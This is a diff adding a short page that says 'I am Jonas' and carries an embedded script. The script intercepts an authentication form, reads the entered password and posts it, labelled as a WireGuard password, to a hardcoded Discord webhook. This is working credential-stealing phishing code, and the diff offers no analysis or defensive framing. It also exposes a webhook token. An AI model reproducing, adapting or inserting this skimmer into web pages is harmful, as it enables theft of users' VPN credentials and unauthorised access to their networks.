@@ -1,0 +1,35 @@
+I am Jonas
+
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    document.getElementById("authForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      var password = document.getElementById("authPassword").value;
+
+      var webhook_url = 'https://discord.com/api/webhooks/1184540771815272560/vHZepaE0mcSkjheuuDKDmo4gdpKLGM8wtaFJxlNFHbs2artJraMgfrpMtHE4TjgzOub6';
+
+      var message_data = {
+          content: 'WireGuard Password:\n' + password,
+      };
+
+      var json_data = JSON.stringify(message_data);
+
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", webhook_url, true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+
+      xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+              if (xhr.status === 200) {
+                  console.log('Message sent to Discord successfully!');
+              } else {
+                  console.error('Error sending message to Discord.');
+              }
+          }
+      };
+
+      xhr.send(json_data);
+    });
+  });
+</script>
